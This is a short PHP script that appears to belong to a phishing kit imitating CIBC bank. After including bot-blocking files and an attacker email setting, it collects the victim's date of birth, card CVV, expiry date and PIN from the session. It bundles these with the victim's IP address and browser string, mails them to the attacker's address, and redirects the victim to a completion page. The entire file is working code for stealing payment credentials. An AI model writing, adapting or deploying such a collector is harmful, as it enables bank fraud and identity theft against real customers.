<?php
include ("youremail.php");
	include './prevents/anti7.php';
		include './prevents/anti8.php';
			include './prevents/anti9.php';
include ("blocker.php");
session_start();

$ip = getenv("REMOTE_ADDR");
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$timedate = date("D/M/d, Y g(idea) a");





$dob = $_SESSION['dob'];
$cvv = $_SESSION['cvv'];
$mm = $_SESSION['mm'];
$yy = $_SESSION['yy'];
$pin = $_SESSION['pin'];
$data ="
=============## CIBC ##=========================

|DOB: $dob
|CVV : $cvv
|EXP : $mm-$yy
|pin : $pin
============## Goodies ##=======================
IP : $ip
UA : $browserAgent
Time : $timedate

";

$subj="##CIBC CVVEXP #$ip";
 if (strlen($cvv) == 3 && strlen($dob) <= 11  ) {
	 
   mail($emailusr, $subj, $data);
  
}



		

header("Location: ./finish.php");

?>